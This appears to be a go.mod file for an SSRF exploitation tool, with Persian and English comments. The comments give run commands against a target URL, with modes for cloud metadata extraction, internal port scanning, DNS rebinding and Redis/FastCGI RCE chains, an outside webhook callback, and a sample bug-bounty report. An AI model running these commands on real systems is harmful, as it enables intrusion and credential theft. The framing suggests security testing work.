module ssrf-framework

go 1.21

// go 1.21
// 🚀 Build & Run
// # Build
// go build -o ssrf-exploit main.go
//
// # اجرا روی سرور
// ./ssrf-exploit -u "http://target.com/page?id=1" -p url -w "https://webhook.site/abc" -mode all -t 50
//
// # فقط metadata
// ./ssrf-exploit -u "http://target.com/page" -p image -mode metadata
//
// # فقط port scan
// ./ssrf-exploit -u "http://target.com/page" -p url -mode scan -t 100
//
// # DNS rebinding
// ./ssrf-exploit -u "http://target.com/page" -p callback -mode rebinding
//
// # RCE chains
// ./ssrf-exploit -u "http://target.com/page" -p url -mode rce
// 📊 ویژگی‌های v3.0
// قابلیتتوضیح✅ DNS RebindingDNS server داخلی + nip.io✅ Cloud Metadata6 provider (AWS/GCP/Azure/DO/Oracle/Alibaba)✅ IPv6شامل encoded IPs✅ RCE ChainsRedis, Memcached, FastCGI, SMTP, ES✅ HTML Reportزیبا با dark mode و sort by severity✅ JSON Reportبرای automation✅ 110+ پورتاسکن کامل✅ Multi-threadedتا 100 worker✅ Custom Headersبرای endpoints protected✅ Auto Severitycritical/high/medium/low
// 💡 نمونه گزارش Bug Bounty
// ## SSRF with Internal Network Access - Critical
//
// Target: target.com
// Endpoint: /api/preview?url=
// Severity: Critical (CVSS 9.1)
//
// ### Impact:
// 1. AWS IAM credentials extracted (full account takeover)
// 2. Internal Redis accessible at 127.0.0.1:6379 (no auth)
// 3. Internal admin panel at 127.0.0.1:8080
//
// ### Reproduction:
// [payload ها از گزارش]
//
// ### Evidence:
// [response body از گزارش]
